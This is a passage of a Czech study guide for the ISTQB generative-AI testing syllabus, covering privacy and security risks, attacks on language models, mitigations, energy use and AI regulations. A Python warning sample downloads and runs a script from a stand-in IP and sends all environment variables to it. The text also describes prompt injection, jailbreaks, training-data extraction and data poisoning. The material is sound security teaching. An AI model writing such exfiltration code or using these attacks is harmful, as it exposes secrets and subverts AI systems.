U otázky na snížení variability hledejte dvě odpovědi ze sylabu: snížení teploty a nastavení semínka. Učící rychlost (learning rate) je distraktor. Nastavuje se před tréninkem a s variabilitou při inferenci nesouvisí. Pozor na formulace „zvýšení semínka“ nebo „snížení semínka“. Na hodnotě semínka nezáleží a semínko rozdělení pravděpodobností nezužuje. Rozdělení zužuje jen nižší teplota. A pozor na slovo „zaručí“: úplnou reprodukovatelnost nezaručí nic.
:::

:::zkouska
Rozpor v kurzech. Jeden z Udemy kurzů tvrdí, že semínko nastavuje minimum a maximum výstupu nebo omezí model na určité téma. To neplatí. Jiný kurz uvádí rozsah teploty jen 0 až 1. Ve zkoušce rozhoduje definice ze sylabu, konkrétní rozsah se nezkouší.
:::

## 3.2 Rizika pro ochranu dat a bezpečnost při použití generativní AI v testování

:::lo
GenAI-3.2.1 (K2) Explain key data privacy and security risks associated with using generative AI in software testing
GenAI-3.2.2 (K2) Give examples of data privacy and vulnerabilities in using Generative AI in software testing
GenAI-3.2.3 (K2) Summarize mitigation strategies to protect data privacy and enhance security in Generative AI for software testing
:::

Testování pracuje s daty, která bývají citlivá: kopie produkčních záznamů, logy, popisy defektů se snímky obrazovky, specifikace s obchodním tajemstvím. Když s nimi pracuje generativní AI, vznikají nová rizika. Data opouštějí známé prostředí a putují k modelu. A samotná testovací infrastruktura postavená na LLM se stává cílem útoků. Sylabus proto žádá robustní ochranu dat, která zabrání únikům, neoprávněnému přístupu a vyzrazení důvěrných informací.

Tři klíčová slova oddílu mají ustálený význam z glosáře ISTQB. **Data privacy** (ochrana dat a soukromí) je ochrana osobních údajů nebo jinak citlivých informací před nežádoucím prozrazením. **Security** (bezpečnost) je míra, do jaké systém chrání svá data a zdroje před neoprávněným přístupem nebo použitím a zároveň zajišťuje přístup oprávněným uživatelům. **Vulnerability** (zranitelnost) je slabina v komponentě, systému, postupech nebo kontrolách, kterou může útočník využít k úspěšnému útoku.

:::pojem term="data privacy"
Ochrana dat a soukromí: ochrana osobních údajů a jiných citlivých informací před nežádoucím prozrazením. U generativní AI jde hlavně o to, co se dostane do promptu a co se s tím u poskytovatele modelu stane.
:::

:::pojem term="security"
Bezpečnost: míra, do jaké komponenta nebo systém chrání svá data a zdroje před neoprávněným přístupem či použitím a zajišťuje neomezený přístup oprávněným uživatelům.
:::

:::pojem term="vulnerability"
Zranitelnost: slabina v komponentě, systému, postupech nebo kontrolách, kterou lze zneužít k úspěšnému bezpečnostnímu útoku. U LLM jde například o to, že model neodliší instrukci od dat.
:::

### 3.2.1 Rizika pro ochranu dat a bezpečnost

#### Rizika pro ochranu dat

Generativní AI zpracovává velké objemy dat. Ta mohou obsahovat citlivé informace nebo **personally identifiable information (PII)** (osobní identifikační údaje), tedy údaje, podle kterých lze určit konkrétní osobu. Sylabus jmenuje tři obavy.

**Unintentional data exposure** (neúmyslné vyzrazení dat). Model může vytvořit výstup, který nechtěně odhalí citlivou informaci. Typicky ji zopakuje ze vstupu. Tester vloží do promptu výřez produkčního logu se jmény klientů. Model z něj udělá testovací případy a jména klientů v nich zůstanou. Testovací případy pak putují do nástroje pro správu testů, kam má přístup celý dodavatelský tým.

**Lack of control over data usage** (ztráta kontroly nad použitím dat). Nástroje generativní AI mohou data ukládat a zpracovávat bez výslovného souhlasu nebo kontroly uživatele. Nevíte, kde prompt leží, jak dlouho tam zůstane, kdo k němu má přístup a zda poslouží k dalšímu tréninku. To otevírá cestu ke zneužití nebo neoprávněnému přístupu.

**Compliance risks** (rizika nesouladu s předpisy). Použití nástrojů generativní AI v rozporu s předpisy o ochraně dat může vést k právním sporům. Sylabus jmenuje obecné nařízení o ochraně osobních údajů, **General Data Protection Regulation (GDPR)**, tedy nařízení (EU) 2016/679.

#### Bezpečnostní rizika

K tomu sylabus přidává tři bezpečnostní rizika specifická pro testování s generativní AI.

Za prvé: **LLM-powered test infrastructure** (testovací infrastruktura postavená na LLM) může být zranitelná vůči útokům, například únikům dat nebo neoprávněnému přístupu. Testovací nástroj s LLM je software jako každý jiný. Má rozhraní, přihlašování, úložiště a integrace.

Za druhé: útočníci mohou zneužít zranitelnosti samotných modelů. Sylabus mluví o manipulativních útocích, které rozebírá oddíl 3.2.2. Útočník jimi mění chování modelu nebo z něj získává citlivé informace.

Za třetí: útočníci mohou do modelu úmyslně vnést škodlivá vstupní data. Cílem je model zmást a narušit jeho přesnost nebo bezpečnost.

Rozdíl mezi oběma skupinami se hodí znát. Rizika pro ochranu dat vznikají i bez útočníka, prostě nevhodným zacházením s daty. Bezpečnostní rizika počítají s někým, kdo slabinu aktivně zneužije.

:::praxe
Proč klientská data nepatří do veřejného chatbota. Tester v pojišťovně analyzuje selhání při zpracování pojistné události. Má log se jménem klienta, rodným číslem, číslem účtu a popisem zranění. Chce, aby mu model log shrnul.

Když log vloží do veřejného chatbota, uplatní se všechna tři rizika najednou. Data opustí pojišťovnu a tester ztratí kontrolu nad tím, kde jsou a kdo je uvidí. Popis zranění je údaj o zdraví, tedy zvláštní kategorie osobních údajů podle GDPR, a pro jeho předání chybí právní základ. A model může údaje zopakovat ve výstupu, který tester pak vloží do reportu o defektu. Tím se citlivá data rozšíří dál.

Firma obvykle stanoví schválené nástroje. Schválený nástroj má s firmou smlouvu, která říká, kde data leží, jak dlouho a že neslouží k tréninku. Má přihlašování přes firemní identitu a audit. Ani schválený nástroj ale neznamená, že do něj smíte vložit cokoli. Pravidla, co do něj smí, určuje firma. Konec příkladu.
:::

:::zkouska
Hlavní riziko pro ochranu dat při testování s generativní AI je, že citlivé nebo proprietární informace vložené do promptu budou vyzrazeny nebo zpracovány bez kontroly. Pomalá odezva, nekonzistentní výstup nebo halucinace nejsou rizika pro ochranu dat. Pozor zejména na halucinace v syntetických testovacích datech. Když model vymyslí jméno a adresu, nevyzrazuje skutečná data, pokud nebyl na skutečných citlivých datech trénován.
:::

### 3.2.2 Zranitelnosti a útoky na generativní AI v testování

Sylabus uvádí tabulku čtyř **attack vectors** (vektorů útoku), tedy cest, kudy útočník na systém s generativní AI míří. Ve zkoušce z toho padnou dvě otázky. Typická otázka popíše situaci a vy máte určit vektor, nebo přiřadit čtyři příklady ke čtyřem vektorům.

| Vektor útoku | Podstata podle sylabu | Příklad ze sylabu | Vlastní příklad z testování |
|---|---|---|---|
| context manipulation | požadavky navržené tak, aby z modelu vytáhly důvěrná trénovací data | překročení kontextového okna dlouhými prompty, model vypustí útržky trénovacích dat | dotazy na model doladěný na interních reportech o defektech, které z něj vylákají e-maily klientů zapomenuté v reportech |
| request manipulation | vložení dat, která naruší výstup modelu | obrázek, který model zavede do jiného kontextu a vyvolá halucinace třeba v akceptačních kritériích | snímek obrazovky přiložený k defektu se skrytým textem, který model navede k chybnému návrhu testů |
| data poisoning | manipulace s trénovacími daty | falešná hodnocení při posuzování výsledků AI generovaného reportu o testování | tester s přístupem k internímu nástroji opakovaně označuje vadné vygenerované skripty jako vzorové, nástroj se z nich učí |
| malicious code generation | přimět LLM, aby při použití generoval zadní vrátka, například volání externích příkazů | kód, který otevře komunikační kanál na konkrétní škodlivou IP adresu | pomocná funkce testovacího skriptu, která potají posílá proměnné prostředí na cizí server |

Tabulka srovnává čtyři vektory. Pomůže si všimnout, kdy útok probíhá. Data poisoning míří na trénovací data, tedy na to, z čeho se model učí. Ostatní tři vektory se odehrávají při používání modelu.

#### Manipulace s kontextem

**Context manipulation** (manipulace s kontextem) je posílání požadavků, které mají z modelu vytáhnout důvěrná trénovací data. Sylabus uvádí příklad s kontextovým oknem. Dlouhé prompty, které okno překročí, mohou model zahltit. Model pak může vypustit náhodné útržky svých trénovacích dat, a mezi nimi i citlivé informace.

Pro testování je důležité, co je v trénovacích datech. Pokud firma doladí model na vlastních reportech o defektech nebo testovacích logech, mohou v nich zůstat osobní údaje, tokeny nebo interní adresy. Útočník s přístupem k modelu je pak může zkusit vylákat. Odtud plyne pravidlo: do dat pro doladění nepatří nic, co by nesmělo uniknout.

:::pojem term="context manipulation"
Manipulace s kontextem: vektor útoku, při kterém útočník posílá požadavky navržené tak, aby z modelu získal důvěrná trénovací data. Příkladem je zahlcení kontextového okna dlouhými prompty, po kterém model vypustí útržky trénovacích dat.
:::

:::nad-ramec
Výzkum tento typ útoku doložil. V roce 2023 výzkumníci ukázali, že když jazykový model požádají, aby donekonečna opakoval jedno slovo, model se po čase odchýlí. Začne vypisovat doslovné úseky textu ze svých trénovacích dat, včetně kontaktních údajů skutečných lidí. Poskytovatel pak takové požadavky zablokoval. Útok patří do skupiny, kterou sylabus nazývá manipulace s kontextem.
:::

#### Manipulace s požadavkem

**Request manipulation** (manipulace s požadavkem) je vložení dat, která naruší výstup modelu. Sylabus uvádí obrázky, které model zavedou do jiného kontextu. Model pak halucinuje například akceptační kritéria. Útočník tu nechce data získat. Chce, aby model vytvořil chybný výstup.

V testování se modelům často předávají přílohy: snímky obrazovky, PDF se specifikací, exporty z nástrojů. Každá taková příloha může nést obsah, který model vyloží jako pokyn. Tester to nemusí vůbec vidět, protože text může být bílý na bílém pozadí nebo velmi malý.

:::nad-ramec
V odborné literatuře i v praxi se pro tuto rodinu útoků používá název **prompt injection**. Útočník vloží do vstupu text, který model vyloží jako instrukci. Přímá varianta znamená, že útočník píše přímo do promptu. Nepřímá varianta (indirect prompt injection) znamená, že instrukce je schovaná v dokumentu, webové stránce nebo obrázku, který model zpracuje. Příbuzný pojem **jailbreak** označuje prompt, který má model přimět obejít vlastní ochranná pravidla.

Sylabus v1.1 slova prompt injection ani jailbreak nepoužívá. Nejblíž mají k vektoru request manipulation. Projekt OWASP vydává seznam nejčastějších rizik aplikací s LLM, OWASP Top 10 for LLM Applications, a prompt injection v něm stojí na prvním místě. Pro zkoušku platí čtyři vektory z tabulky sylabu.
:::

#### Otrávení dat

**Data poisoning** (otrávení dat) je manipulace s trénovacími daty. Sylabus uvádí příklad z testování: falešná hodnocení při posuzování výsledků reportu o testování, který vytvořila AI. Když nástroj sbírá od testerů hodnocení „dobrý / špatný výstup“ a učí se z nich, pak podvržená hodnocení model postupně naučí špatné vzory. Kvalita klesá pomalu a nenápadně.

Otrávení se nemusí týkat jen původního tréninku. Týká se i dat, na kterých se model dolaďuje, a zpětné vazby, ze které se dál učí. Rozhodující je, že útok míří na to, z čeho se model učí, ne na jednu konkrétní konverzaci.

:::nad-ramec
Příbuzné riziko vzniká u RAG z kapitoly 4. Když útočník podstrčí falešný dokument do báze znalostí, ze které model čerpá, ovlivní odpovědi bez zásahu do trénovacích dat. Odborně se tomu někdy také říká otrávení, ale technicky jde o manipulaci se vstupy při použití. Ve zkoušce se držte definice ze sylabu: data poisoning je manipulace s trénovacími daty.
:::

#### Generování škodlivého kódu

**Malicious code generation** (generování škodlivého kódu) znamená, že útočník model zmanipuluje, aby při používání vytvořil kód se zadními vrátky (backdoor). Sylabus jmenuje volání externích příkazů a příklad kódu, který otevře komunikační kanál na konkrétní škodlivou IP adresu.

Pro testery je to riziko zvlášť velké. Testovací skripty běží s přístupem do testovacích prostředí, k databázím a k tajným údajům v CI. Kdo vygenerovaný skript pustí bez revize, pustí do prostředí cokoli, co v něm je. Takto může vypadat podezřelý kód:

```python
import os, subprocess, requests

def priprav_prostredi():
    # Inicializace testovacích dat
    subprocess.run(["curl", "-s", "http://203.0.113.45/init.sh", "-o", "/tmp/i.sh"])
    subprocess.run(["sh", "/tmp/i.sh"])
    requests.post("http://203.0.113.45/log", json=dict(os.environ))
```

Rozbor. Funkce má nevinný název a komentář. Ve skutečnosti stáhne skript z neznámé IP adresy a spustí ho. Pak odešle všechny proměnné prostředí, tedy i tokeny a hesla z CI, na stejný server. Varovné znaky jsou volání `subprocess`, stahování ze sítě, pevná IP adresa a odesílání `os.environ`. Nic z toho testovací příprava dat nepotřebuje. Adresa v ukázce patří do rozsahu vyhrazeného pro dokumentaci.

:::zkouska
Rozpor mezi verzemi sylabu. Ve verzi 1.0 se první vektor jmenoval **data exfiltration** (vynesení dat). Verze 1.1 ho přejmenovala na context manipulation. Popis i příklad zůstaly stejné. Dva Udemy kurzy vycházejí z verze 1.0 a používají starý název. Ve zkoušce podle v1.1 hledejte context manipulation.
:::

:::zkouska
Jak rozlišit vektory v otázce. Útočník chce získat data, která model zná z tréninku? Context manipulation. Útočník podstrčí vstup, obrázek nebo dokument, aby model při použití vytvořil chybný výstup? Request manipulation. Útočník mění to, z čeho se model učí, například hodnocení nebo trénovací záznamy? Data poisoning. Model má vytvořit kód se zadními vrátky? Malicious code generation.
:::

### 3.2.3 Jak chránit data a posílit bezpečnost

S rozšířením generativní AI vznikají předpisy a standardy, které mají rizika zmírnit. Jmenuje je oddíl 3.4.1. Sylabus k tomu přidává důležitou poznámku o GDPR. Předpisy na ochranu dat použití generativní AI výslovně nezakazují. Obsahují ale pojistky, které mohou omezit, co se smí dělat. Jde hlavně o zákonnost zpracování a o omezení účelu, pro který se data shromažďují, zpracovávají a ukládají.

Sylabus pak řadí opatření do dvou skupin. První skupina jsou opatření na ochranu dat. Druhá jsou doplňková opatření pro nasazení generativní AI v testování.

#### Opatření na ochranu dat

**Data minimization** (minimalizace dat). Citlivá data nezpracovávejte, pokud to zákon výslovně nedovoluje. A i z necitlivých dat použijte jen tolik, kolik úloha potřebuje. Pro návrh testů na formulář nepotřebujete žádný skutečný záznam klienta. Stačí popis polí a pravidel.

**Data anonymization and pseudonymization** (anonymizace a pseudonymizace). Citlivé údaje zamaskujte nebo nahraďte údaji, které nikoho neidentifikují. Rozdíl mezi oběma technikami je podstatný. Anonymizace vazbu na osobu nevratně zruší. Pseudonymizace údaj nahradí zástupným identifikátorem, ale vazbu lze s pomocí odděleně uložené tabulky obnovit.

**Secure data storage and transmission** (bezpečné uložení a přenos dat). Používejte silné šifrování a řízení přístupu. To platí pro data v klidu i při přenosu k modelu.

**Resources training** (školení lidí). Organizace má zavést jasné školicí programy a pravidla. Lidé mají vědět, jak nástroje generativní AI používat odpovědně, jaké jsou etické zásady a jak omezit rizika. Nejlepší technické opatření nepomůže, když tester neví, že produkční log nesmí do chatbota.

:::nad-ramec
Podle GDPR jsou pseudonymizovaná data stále osobními údaji, protože vazbu na osobu lze obnovit. Teprve skutečně anonymizovaná data pod GDPR nespadají. Anonymizace je přitom těžší, než vypadá. Kombinace data narození, PSČ a pohlaví často stačí k určení konkrétní osoby i bez jména.
:::

#### Doplňková opatření pro generativní AI v testování

**Systematic review of the generated output** (systematická revize výstupu). Lidské hodnocení je nezbytné pro kvalitu a přesnost úloh, které dělá generativní AI. Revize odhalí i vygenerovaný škodlivý kód nebo citlivé údaje ve výstupu.

**Evaluation by comparison with another LLM** (hodnocení porovnáním s jiným LLM). Stejnou úlohu dáte několika modelům a porovnáte odpovědi. Tím odhalíte výstup, který se od ostatních podezřele liší.

**Choice of a secure, operational environment** (volba bezpečného provozního prostředí). Podle požadované důvěrnosti má organizace tři možnosti. Může použít komerční zabezpečenou nabídku poskytovatele LLM. Může provozovat LLM v zabezpečeném cloudu. Nebo může LLM nainstalovat do vlastní infrastruktury.

**Regular security audits and vulnerability assessments** (pravidelné bezpečnostní audity a hodnocení zranitelností). Slabiny systémů s generativní AI je potřeba hledat a odstraňovat pravidelně, ne jednou při nasazení.

**Staying updated with security best practices** (sledování osvědčených bezpečnostních postupů). Obor se mění rychle. Organizace má sledovat aktuální bezpečnostní doporučení a technologie.

Sylabus zdůrazňuje, že se opatření doplňují a obvykle je potřeba jejich kombinace. Výslovně doporučuje zapojit zkušené bezpečnostní inženýry, právníky, technického ředitele (CTO) nebo ředitele bezpečnosti informací (CISO), pokud je organizace má. Tester o těchto věcech nerozhoduje sám.

Následující tabulka přiřazuje opatření k rizikům z oddílu 3.2.1. Je to pomůcka, sylabus přiřazení takto nedělá.

| Riziko | Opatření, která na něj míří |
|---|---|
| neúmyslné vyzrazení dat | minimalizace, anonymizace a pseudonymizace, systematická revize výstupu |
| ztráta kontroly nad použitím dat | volba bezpečného prostředí, minimalizace, školení |
| riziko nesouladu s předpisy | minimalizace, anonymizace, školení, zapojení právníků |
| útok na testovací infrastrukturu | šifrování a řízení přístupu, bezpečnostní audity |
| manipulativní útoky a škodlivé vstupy | systematická revize, porovnání s jiným LLM, sledování osvědčených postupů |
| škodlivý kód | systematická revize výstupu, audity |

:::praxe
Jak vypadá bezpečný postup v bance. Tým potřebuje testovací data pro nový modul úvěrů. Skutečná data klientů nikdy neopustí produkční prostředí. Do modelu jde jen datový model: názvy polí, datové typy, povolené rozsahy a obchodní pravidla. Model z toho vytvoří generátor syntetických dat, tedy skript. Skript běží v testovacím prostředí a vytváří fiktivní klienty.

Když tým potřebuje analyzovat skutečný log, nejdřív ho anonymizuje. Ukázka s fiktivními údaji:

```text
Před anonymizací:
2026-10-03 09:14:22 ERROR Platba zamítnuta: klient Jana Nováková,
RČ 856215/1234, účet 1234567890/0100, částka 12 500 Kč, důvod LIMIT_EXCEEDED

Po anonymizaci:
2026-10-03 09:14:22 ERROR Platba zamítnuta: klient <KLIENT_1>,
RČ <RC_1>, účet <UCET_1>, částka 12 500 Kč, důvod LIMIT_EXCEEDED
```

Přesně řečeno jde o pseudonymizaci, pokud si tým uloží tabulku, která přiřazuje `<KLIENT_1>` ke skutečnému jménu. Bez té tabulky a bez dalších identifikujících údajů v logu se blíží anonymizaci. Pro analýzu chyby LIMIT_EXCEEDED jméno ani rodné číslo potřeba nejsou. To je minimalizace v praxi.

Upravený log pak jde do schváleného nástroje, ne do veřejného chatbota. Pokud schválený nástroj pro danou úlohu chybí, cesta vede přes tým, který ve firmě spravuje AI platformu. Obcházet blokaci soukromým účtem je přesně stínová AI (shadow AI), o které mluví kapitola 5. Konec příkladu.
:::

:::praxe
Případová studie pro praktické cvičení HO-3.2.3, které sylabus vede jako ukázku (H0). Testovací tým v pojišťovně si sám, bez schválení, nasadil volně dostupný nástroj, který generuje testovací případy z požadavků. Nástroj běží jako webová služba třetí strany. Tým do něj nahrává požadavky včetně příloh s ukázkovými formuláři od skutečných klientů. Vygenerované skripty se automaticky spouštějí v CI s přístupem k testovací databázi, která je kopií produkce.

Rizika: přílohy obsahují osobní údaje (neúmyslné vyzrazení, nesoulad s GDPR). Tým neví, co služba s daty dělá (ztráta kontroly). Testovací databáze je kopie produkce, takže případný únik má plný dopad. Skripty běží bez revize, takže škodlivý kód by se spustil (malicious code generation). Přílohy od klientů mohou nést vložený text, který změní výstup (request manipulation).

Opatření: nahradit kopii produkce syntetickými daty. Přílohy anonymizovat nebo vůbec nepoužívat. Přejít na schválený nástroj v zabezpečeném prostředí. Zavést povinnou revizi vygenerovaných skriptů před spuštěním. Omezit oprávnění CI na minimum. Zapojit CISO a právníka. Proškolit tým. Konec příkladu.
:::

:::praxe
Lokální model jako jedna z možností volby bezpečného prostředí. Kurz o AI nástrojích pro QA ukazuje desktopovou aplikaci GPT4All s funkcí LocalDocs. Model běží na vlastním počítači, dokumenty se indexují lokálně a nic se neposílá na internet. Jan tento přístup může vyzkoušet na vlastních projektech, třeba na dokumentaci k Účtenkám. Ve firmě ale platí, že i lokální instalace modelu je software, který musí schválit IT. Lektor kurzu to sám zdůrazňuje: nejdřív se zeptat správce. Konec příkladu.
:::

:::zkouska
Otázky k 3.2.3 obvykle nabízejí jedno správné opatření na ochranu dat a tři distraktory. Distraktory bývají opatření proti jinému riziku, například porovnání více modelů, které zlepšuje přesnost, ne ochranu dat. Nebo jsou zjevně škodlivé: neomezený přístup k datům, vypnutí šifrování. Hledejte opatření, které přímo omezuje, co citlivého se k modelu dostane: minimalizaci, anonymizaci, pseudonymizaci.
:::

## 3.3 Spotřeba energie a dopad generativní AI na životní prostředí

:::lo
GenAI-3.3.1 (K2) Explain the impact of task characteristics and model usage on the energy consumption of Generative AI in software testing
:::

Sylabus začíná studií Luccioni 2024a. Ta ukázala, že trénink i provoz LLM vyžadují intenzivní využití velkého množství specializovaného výpočetního hardwaru. LLM se nabízejí jako webové služby. Každé jejich použití zatěžuje zařízení uživatele, sítě a datová centra. Výsledkem je vyšší spotřeba energie.

### 3.3.1 Vliv generativní AI na spotřebu energie a emise CO₂

Sylabus říká, že dopad na životní prostředí se nemá podceňovat. Spotřeba energie prudce roste s rostoucím používáním. Ovlivňují ji dva faktory: složitost úlohy a výpočetní zdroje, které úloha potřebuje.

Sylabus uvádí srovnání z článku v MIT Technology Review (Heikkilä 2023). Vygenerování jednoho obrázku výkonným modelem může spotřebovat tolik energie jako úplné nabití chytrého telefonu. Vygenerování textu spotřebuje jen malé procento nabití telefonu. Rozdíl je tedy v řádech, ne v procentech.

Přesná data o dopadu generativní AI se získávají těžko. Sylabus to dokládá článkem v časopise Nature (Luccioni 2024b). Je ale jasné, že tyto energeticky náročné operace dohromady přispívají k významným emisím CO₂ (Berthelot 2024). Jedno vyhledávání nebo jedno vygenerování textu se může zdát zanedbatelné. Souhrnný účinek přes miliony uživatelů po celém světě je ale velký.

Sylabus končí doporučením. Zavést osvědčené postupy, například omezit zbytečné interakce s modelem, je podstatné pro zmírnění environmentálních rizik.

#### Co z toho plyne pro úlohy testování

Cíl 3.3.1 chce, abyste uměli vysvětlit vliv dvou skupin faktorů: vlastností úlohy a způsobu použití modelu. Sylabus je výslovně nerozepisuje. Z jeho textu a z kapitoly 1 ale plyne toto.

Vlastnosti úlohy. Nejvíc rozhoduje druh výstupu. Generování obrázků nebo videa je řádově náročnější než generování textu. Pro testování to znamená, že vygenerování stovek obrázků pro vizuální testy má jinou stopu než vygenerování stovek textových testovacích případů. Dále rozhoduje délka vstupu a výstupu. Oddíl 1.1.2 uvádí, že větší počet tokenů v kontextovém okně zvyšuje výpočetní náročnost a dobu zpracování. Poslat modelu celý desetimegabajtový log je dražší než poslat výřez kolem chyby. A rozhoduje složitost úlohy: náročnější úloha potřebuje víc výpočtu.

Způsob použití modelu. Větší model potřebuje víc výpočetních zdrojů na každý token. Na jednoduchou úlohu, třeba převod formátu dat, stačí menší model. Dále rozhoduje četnost. Prompt, který se spouští v každém nočním běhu CI pro každý testovací případ, se za rok sečte do velkého čísla. Do stejné skupiny patří opakované běhy kvůli nedeterminismu a porovnání více modelů. Obě techniky z oddílu 3.1 zlepšují spolehlivost, ale násobí spotřebu. I tady platí, že jejich hloubka má odpovídat riziku.

Jednoduchý výpočet ukazuje, jak se čísla skládají. Spotřeba energie je výkon krát doba. Emise jsou spotřeba energie krát emisní faktor elektřiny, tedy kolik gramů CO₂ připadá na jednu kilowatthodinu v dané síti.

```text
E [kWh]    = počet požadavků × energie na jeden požadavek [kWh]
CO2 [kg]   = E [kWh] × emisní faktor [kg CO2/kWh]

Ilustrační srovnání se smyšlenými hodnotami (jen pro pochopení poměrů):
úloha A: 1 000 textových testovacích případů, malý model     → základ x
úloha B: tytéž případy, velký model                          → několikanásobek x
úloha C: tytéž případy, velký model, každý 5× kvůli kontrole → pětinásobek úlohy B
úloha D: 1 000 vygenerovaných obrázků pro vizuální testy     → řádově víc než A
```

Hodnoty v ukázce nejsou naměřené. Skutečná čísla záleží na modelu, hardwaru a zdroji elektřiny v datovém centru. Sylabus sám upozorňuje, že přesná data se získávají těžko.

Sylabus k tomuto cíli přidává praktické cvičení HO-3.3.1 úrovně H1. Účastníci v simulátoru spočítají spotřebu energie a emise CO₂ pro zadané testovací úlohy. Sledují, jak se výsledky mění s vlastnostmi úlohy a se způsobem použití modelu. Konkrétní simulátor sylabus nejmenuje.

:::nad-ramec
Nástroje, na kterých lze cvičení udělat. Kalkulačka EcoLogits odhaduje spotřebu a emise jednoho volání modelu podle poskytovatele, modelu a počtu vygenerovaných tokenů. Python knihovna CodeCarbon měří spotřebu a emise kódu, který běží na vašem počítači, takže se hodí pro lokální modely. Hugging Face provozuje žebříček AI Energy Score, který porovnává spotřebu modelů na stejných úlohách. Dostupnost a metodiku nástrojů si před použitím ověřte, vyvíjejí se rychle. Žádný z nich sylabus nejmenuje.
:::

:::praxe
Testovací tým nechal v CI generovat testovací data pro každý z 800 regresních testů při každém nočním běhu. Data se přitom měnila jen při změně datového modelu, zhruba jednou za měsíc. Tým generování přesunul do kroku, který běží jen při změně schématu, a data ukládá. Počet volání modelu klesl zhruba třicetkrát. Spolu s energií klesly i náklady a doba běhu. Opakovatelnost se zlepšila, protože testy běží nad stejnými daty. Konec příkladu.
:::

:::zkouska
Generování obrázků je výrazně náročnější na energii než generování textu, protože vyžaduje víc výpočtu. Ne naopak. Spotřeba a emise spolu běžně souvisejí, pokud otázka nezmíní jiný zdroj energie. Souhrnný dopad textových úloh přes miliony uživatelů zanedbatelný není. A vyhledávání s generativní AI spotřebuje víc energie než klasické webové vyhledávání.
:::

## 3.4 Předpisy, standardy a rámce osvědčených postupů pro AI

:::lo
GenAI-3.4.1 (K1) Recall examples of AI regulations, standards and best practice frameworks relevant to Generative AI in software testing
:::

Generativní AI testerům pomáhá v mnoha úlohách z kapitoly 2. Přináší ale i rizika z oddílů 3.1 až 3.3: chyby v uvažování, ohrožení ochrany dat, zranitelnosti a dopad na životní prostředí. Sylabus říká, že při jejich řešení je třeba brát v úvahu obecné předpisy, standardy a rámce osvědčených postupů pro AI.

Tři druhy dokumentů se liší závazností. **Regulation** (předpis, nařízení) je právně závazný. Jeho nedodržení má právní následky. **Standard** (norma) je dobrovolný, pokud ho nevyžaduje smlouva nebo zákon. Organizace se podle něj může certifikovat. **Framework** (rámec) je soubor doporučení, jak postupovat. Není závazný a neslouží k certifikaci.

### 3.4.1 Předpisy, standardy a rámce relevantní pro generativní AI v testování

Sylabus uvádí přehled čtyř dokumentů. Ve zkoušce stačí úroveň K1: poznat, které dokumenty do přehledu patří, jakého jsou typu a čeho se týkají.

| Název | Typ | Čeho se týká | Význam pro testování s generativní AI |
|---|---|---|---|
| ISO/IEC 42001:2023 | standard | požadavky na systém řízení AI v organizaci | podporuje, aby generativní AI v testování dodržovala doporučené postupy; konzistence a spolehlivost |
| ISO/IEC 23053:2022 | standard | rámec pro procesy životního cyklu AI systémů se strojovým učením; bezpečnost a transparentnost | rámec pro kvalitu dat, transparentnost a bezpečnost při použití generativní AI v testování |
| EU AI Act | předpis (regulation) | právní rámec pro rizika AI; aplikace dělí podle úrovně rizika | vyžaduje soulad v transparentnosti, odpovědnosti a zmírňování zkreslení |
| NIST AI Risk Management Framework | rámec (USA) | doporučení k řízení rizik AI; férovost, transparentnost, bezpečnost | podporuje férovost a zmírňuje rizika, předchází zkresleným výsledkům testů |

Tabulka shrnuje přehled ze sylabu. Ke každému dokumentu ještě pár vět.

**ISO/IEC 42001:2023** (Information technology – Artificial intelligence – Management system) stanoví požadavky na řízení AI systémů v organizaci. Je to norma pro systém řízení. Říká, jak má organizace nastavit pravidla, role a procesy pro práci s AI. V testování pomáhá, aby tým používal generativní AI podle doporučených postupů, a výsledky tak byly konzistentní a spolehlivé.

**ISO/IEC 23053:2022** (Framework for Artificial Intelligence (AI) Systems Using Machine Learning (ML)) popisuje rámec pro AI systémy se strojovým učením a procesy jejich životního cyklu. Zdůrazňuje bezpečnost a transparentnost. V testování dává rámec pro kvalitu dat, transparentnost a bezpečnost.

**EU AI Act** je evropský předpis, který zavádí právní rámec pro rizika AI. AI aplikace dělí podle úrovně rizika. Pro generativní AI v testování vyžaduje soulad v oblasti transparentnosti, odpovědnosti a zmírňování zkreslení. Sylabus jako zdroj uvádí stránku Evropské komise o evropském přístupu k AI.

**NIST AI Risk Management Framework** (AI RMF 1.0) vydal americký Národní institut pro standardy a technologie (NIST). Nabízí doporučení pro řízení rizik AI se zaměřením na férovost, transparentnost a bezpečnost. V testování podporuje férovost a pomáhá předcházet zkresleným výsledkům testů.

K těmto čtyřem dokumentům patří ještě GDPR, které sylabus zmiňuje v oddílech 3.2.1 a 3.2.3. GDPR je předpis o ochraně osobních údajů. Na generativní AI nemíří, ale vztahuje se na každé zpracování osobních údajů, tedy i v promptu.

Sylabus oddíl uzavírá upozorněním. Technologie AI i předpisy se rychle vyvíjejí. Testovací organizace mají sledovat vývoj předpisů, standardů, národních zákonů a rámců osvědčených postupů, jako jsou ty v tabulce.

:::nad-ramec
Několik ověřitelných faktů navíc, které se nezkoušejí. EU AI Act je nařízení (EU) 2024/1689. Rozlišuje zakázané praktiky, vysoce rizikové systémy, systémy s povinnostmi transparentnosti a systémy s minimálním rizikem. Povinnosti nabíhají postupně od roku 2025. NIST AI RMF 1.0 vyšel v lednu 2023 jako dokument NIST AI 100-1. Člení řízení rizik do čtyř funkcí: Govern, Map, Measure a Manage. NIST k němu v roce 2024 vydal doplňkový profil pro generativní AI. ISO/IEC 42001 je certifikovatelná norma pro systém řízení a má podobnou stavbu jako ISO/IEC 27001 pro bezpečnost informací.
:::

:::praxe
Co z toho dělá tester v bance. Normy a předpisy neimplementuje sám, to je práce compliance, právníků a bezpečnosti. Tester má vědět, že existují, a umět se zeptat. Když tým zavádí nástroj s generativní AI, patří do testovací strategie otázky typu: Spadá použití pod interní pravidla pro AI? Kdo schválil nástroj a pro jaká data? Jak se zaznamenává, že testware vytvořila AI? V regulovaném prostředí se tyto odpovědi dokládají při auditu. Konec příkladu.
:::

:::zkouska
Typická otázka nabízí pět norem a chce dvě, které sylabus uvádí jako relevantní pro generativní AI. Správně jsou ISO/IEC 42001 a ISO/IEC 23053. Distraktory bývají normy ze sylabu CTFL: ISO/IEC 25010 (model kvality produktu) a ISO/IEC/IEEE 29119 (testovací procesy a dokumentace). Ty se generativní AI netýkají. Pamatujte si i typy: 42001 a 23053 jsou standardy, EU AI Act je předpis, NIST AI RMF je rámec z USA.
:::

:::zkouska
